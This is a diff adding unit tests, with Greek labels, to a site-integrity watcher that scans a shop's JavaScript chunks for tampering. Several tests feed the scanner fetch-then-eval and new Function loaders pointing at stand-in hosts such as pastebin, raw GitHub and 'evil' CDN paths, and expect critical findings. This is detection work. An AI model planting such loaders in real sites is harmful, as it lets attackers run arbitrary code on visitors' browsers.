@@ -4,6 +4,7 @@ import { sha256Hex } from "./rules";
 import {
   athensDay, chunkHashDiff, chunkIntegrity, chunkRefs, cloakingDiff, diffDns, heartbeatVerdict, newCerts, parseCertSpotter, parseCrtSh,
   robotsVerdict, scanChunk, scriptSet, seededPick, selectPages, sitemapVerdict, watchCheckOf, zarazProbe, zarazRefs, renderWatchEmail, lightAlerts, dnsRecords,
+  variantChunks, capFinding, publicChecks, sampleFindings, emptyCheck, updateSent,
 } from "./watch-core";
 
 const ORIGIN = "https://euronics.dgsoft.gr";
@@ -317,4 +318,70 @@ test("lightAlerts: μόνο κρίσιμα, όχι αν στάλθηκαν τι�
   const sent = Object.fromEntries(all.slice(0, 1).map((a) => [a.fp, "2026-10-20T09:15:00Z"]));
   assert.deepEqual(lightAlerts(checks, sent, now).map((a) => a.f.title), ["C"]);
   assert.equal(lightAlerts(checks, Object.fromEntries(all.map((a) => [a.fp, "2026-10-19T09:00:00Z"])), now).length, 2); // > 23 ώρες
+});
+
+// ── διορθώσεις αναθεώρησης ──────────────────────────────────────────────────────────────────────────────────────────
+const LOADER = (url: string) => `fetch("${url}").then(function(r){return r.text()}).then(function(t){return new Function(t)()})`;
+
+test("scanChunk: loaders από φιλοξενία περιεχομένου χρηστών + new Function δυναμικό → critical (και όταν ο host είναι «γνωστός»)", () => {
+  for (const u of ["https://cdn.jsdelivr.net/gh/evil/x@main/a.js", "https://raw.githubusercontent.com/evil/x/main/a.js", "https://script.google.com/macros/s/AKfy/exec",
+    "https://unpkg.com/evil-pkg@1/a.js", "https://gist.githubusercontent.com/evil/1/raw/a.js", "https://github.com/evil/x/raw/main/a.js", "https://evil.github.io/a.js",
+    "https://x.pages.dev/a.js", "https://storage.googleapis.com/b/a.js", "https://evil.b-cdn.net/a.js", "https://pastebin.com/raw/abc"]) {
+    assert.ok(has(scanChunk(LOADER(u)), "critical", /eval|Function/), u);
+  }
+  // πρωτόκολλο-σχετικό σε string
+  assert.ok(has(scanChunk(`fetch("//cdn.jsdelivr.net/gh/evil/x/a.js").then(r=>r.text()).then(t=>eval(t))`), "critical", /eval/));
+});
+
+test("scanChunk: ακριβείς γνωστοί hosts / διαδρομές του build → τίποτα· υποτομείς τους → άγνωστοι", () => {
+  assert.deepEqual(scanChunk(`a="https://cdn.jsdelivr.net/npm/tesseract.js@v5/dist/worker.min.js";b="https://cdn.jsdelivr.net/npm/three@0.149.0/x.js";c="https://euronics.b-cdn.net/x.jpg";d="https://www.google.com/maps";e="https://maps.google.com/?q=1";f="https://github.com/vercel/next.js/issues"`), []);
+  assert.deepEqual(scanChunk(`a="https://cdn.jsdelivr.net/npm/tesseract.js-evil@1/a.js"`).map((f) => f.severity), ["warn"]);
+  assert.deepEqual(scanChunk(`a="https://evil.oncloud.gr/s1services"`).map((f) => f.evidence), ["evil.oncloud.gr"]);
+  assert.deepEqual(scanChunk(`a="https://sub.euronics.b-cdn.net/x"`).map((f) => f.severity), ["warn"]);
+});
+
+test("variantChunks: άλλο sha256 → critical· αρχείο μόνο της παραλλαγής που ο φύλακας δεν παίρνει → critical· ίδια → τίποτα", () => {
+  const watch = { "/a.js": { status: 200, sha256: "11" }, "/m.js": { status: 404 } };
+  assert.deepEqual(variantChunks(watch, { "/a.js": { status: 200, sha256: "11" } }, [], "iPhone"), []);
+  assert.deepEqual(sev(variantChunks(watch, { "/a.js": { status: 200, sha256: "99" } }, [], "iPhone")), ["critical"]);
+  const f = variantChunks(watch, { "/m.js": { status: 200, sha256: "77" } }, ["/m.js"], "iPhone");
+  assert.deepEqual(sev(f), ["critical"]);
+  assert.equal(f[0].evidence, "/m.js");
+  assert.deepEqual(sev(variantChunks({ "/n.js": { error: "timeout" } }, {}, ["/n.js"], "iPhone")), ["critical"]);
+  // η παραλλαγή δεν κατέβηκε ενώ ο φύλακας το πήρε → warn (δεν συγκρίθηκε)
+  assert.deepEqual(sev(variantChunks(watch, { "/a.js": { status: 429 } }, [], "iPhone")), ["warn"]);
+});
+
+test("capFinding: όριο λήψεων → warn «μερικός έλεγχος»· χωρίς παράλειψη → τίποτα", () => {
+  assert.deepEqual(capFinding(0, 150), []);
+  assert.deepEqual(sev(capFinding(12, 150)), ["warn"]);
+});
+
+test("publicChecks: το heartbeat χωρίς εσωτερικές λεπτομέρειες (μόνο κατάσταση)· τα υπόλοιπα ίδια", () => {
+  const checks = [watchCheckOf("pages", "Σελίδες", "s", [{ severity: "warn", title: "x", detail: "d", evidence: "e" }], 1),
+    watchCheckOf("heartbeat", "HB", "τελευταίος full: 20/10 07:00 ok · ειδοποιήσεις που δεν παραδόθηκαν: ναι", [{ severity: "warn", title: "Ειδοποιήσεις του εσωτερικού ελέγχου δεν παραδόθηκαν", detail: "d" }], 1)];
+  const p = publicChecks(checks);
+  assert.deepEqual(p[0], checks[0]);
+  assert.equal(p[1].status, "warn");
+  assert.deepEqual(p[1].findings, []);
+  assert.ok(!/full|ειδοποιήσεις/.test(p[1].summary));
+});
+
+test("lightAlerts / updateSent: εγγραφή με ημερομηνία στο μέλλον αγνοείται", () => {
+  const now = new Date("2026-10-20T10:15:00Z");
+  const checks = [watchCheckOf("pages", "Σελίδες", "s", [{ severity: "critical", title: "A", detail: "d", evidence: "e" }], 1)];
+  const fp = lightAlerts(checks, {}, now)[0].fp;
+  assert.equal(lightAlerts(checks, { [fp]: "2027-01-01T00:00:00Z" }, now).length, 1);
+  assert.deepEqual(updateSent({ [fp]: "2027-01-01T00:00:00Z", old: "2026-10-01T00:00:00Z", recent: "2026-10-20T09:00:00Z" }, [], now), { recent: "2026-10-20T09:00:00Z" });
+});
+
+test("sampleFindings: λιγότερες από 10 κατηγορίες / 20 προϊόντα → warn· 0 → error· πλήρες → τίποτα", () => {
+  assert.deepEqual(sampleFindings({ categories: 10, products: 20 }), []);
+  assert.deepEqual(sev(sampleFindings({ categories: 7, products: 20 })), ["warn"]);
+  assert.deepEqual(sev(sampleFindings({ categories: 0, products: 3 })), ["error", "warn"]);
+});
+
+test("emptyCheck: τίποτα δεν ελέγχθηκε → error (ποτέ ok)", () => {
+  assert.deepEqual(emptyCheck("αρχεία JS", 3), []);
+  assert.deepEqual(sev(emptyCheck("αρχεία JS", 0)), ["error"]);
 });
